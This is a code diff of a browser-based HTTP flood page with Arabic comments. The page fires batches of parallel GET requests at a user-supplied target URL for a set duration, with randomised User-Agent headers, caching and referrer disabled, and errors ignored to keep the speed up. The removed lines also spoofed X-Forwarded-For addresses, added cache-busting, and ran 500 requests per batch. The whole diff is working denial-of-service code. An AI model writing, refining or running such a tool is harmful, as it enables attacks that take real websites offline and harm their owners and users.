@@ -20,47 +20,36 @@
         let intervalId;
         let isRunning = false;
 
-        // دالة لإنشاء عنوان IP عشوائي
-        function getRandomIP() {
-            return `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`;
-        }
-
         // دالة لإرسال طلب سريع
-        function sendRequest(targetUrl) {
-            if (!isRunning) return;
+        async function sendRequest(targetUrl) {
+            try {
+                const headers = {
+                    'User-Agent': `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${Math.floor(Math.random() * 20) + 80}.0.${Math.floor(Math.random() * 4000)}.${Math.floor(Math.random() * 200)} Safari/537.36`,
+                    'Accept': '*/*',
+                    'Cache-Control': 'no-cache',
+                    'Pragma': 'no-cache'
+                };
 
-            const headers = {
-                'User-Agent': `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${Math.floor(Math.random() * 20) + 80}.0.${Math.floor(Math.random() * 4000)}.${Math.floor(Math.random() * 200)} Safari/537.36`,
-                'X-Forwarded-For': getRandomIP(),
-                'Accept': '*/*',
-                'Cache-Control': 'no-cache',
-                'Pragma': 'no-cache'
-            };
-
-            // إضافة معرف عشوائي لتجنب التخزين المؤقت
-            const cacheBustUrl = `${targetUrl}?_=${Math.random().toString(36).slice(2)}`;
-
-            fetch(cacheBustUrl, {
-                method: 'GET',
-                headers: headers,
-                mode: 'no-cors',
-                cache: 'no-store',
-                referrerPolicy: 'no-referrer'
-            })
-            .then(() => {
-                if (isRunning) {
+                await fetch(targetUrl, {
+                    method: 'GET',
+                    headers: headers,
+                    mode: 'no-cors',
+                    cache: 'no-store',
+                    referrerPolicy: 'no-referrer'
+                });
+            } catch (e) {
+                // نتجاهل الأخطاء لأننا نريد السرعة القصوى
+            } finally {
+                if(isRunning) {
                     totalRequests++;
                     requestsPerSecond++;
                 }
-            })
-            .catch(() => {
-                // تجاهل الأخطاء للحفاظ على السرعة
-            });
+            }
         }
 
         // دالة لبدء الإرسال
         function startSending(targetUrl, durationSeconds) {
-            if (!targetUrl) {
+            if(!targetUrl) {
                 document.body.textContent = 'خطأ: يرجى تحديد رابط الهدف عبر بارامتر url';
                 return;
             }
@@ -77,19 +66,21 @@
 
             // دالة الإرسال المتواصل
             function sendLoop() {
-                if (!isRunning || Date.now() >= endTime) {
+                if(!isRunning) return;
+                
+                if(Date.now() >= endTime) {
                     stopSending();
                     return;
                 }
 
-                // زيادة عدد الطلبات المتوازية إلى 50
-                const parallelRequests = 500;
-                for (let i = 0; i < parallelRequests; i++) {
+                // إرسال مجموعة من الطلبات بشكل متوازي
+                const parallelRequests = 20;
+                for(let i = 0; i < parallelRequests; i++) {
                     sendRequest(targetUrl);
                 }
 
-                // استخدام requestAnimationFrame بدلاً من setTimeout لتحسين الأداء
-                requestAnimationFrame(sendLoop);
+                // استخدام setTimeout مع تأخير 0 للسماح بمعالجة الأحداث الأخرى
+                setTimeout(sendLoop, 0);
             }
 
             sendLoop();
@@ -102,11 +93,12 @@
         function stopSending() {
             isRunning = false;
             clearInterval(intervalId);
-            document.body.textContent = `تم الانتهاء | rps ${requestsPerSecond} total ${totalRequests}`;
+            document.body.textContent = `rps ${requestsPerSecond} total ${totalRequests}`;
         }
 
         // بدء التنفيذ عند تحميل الصفحة
         window.onload = function() {
+            // تهيئة نمط الصفحة
             document.body.style.margin = '0';
             document.body.style.padding = '0';
             document.body.style.fontFamily = 'monospace';
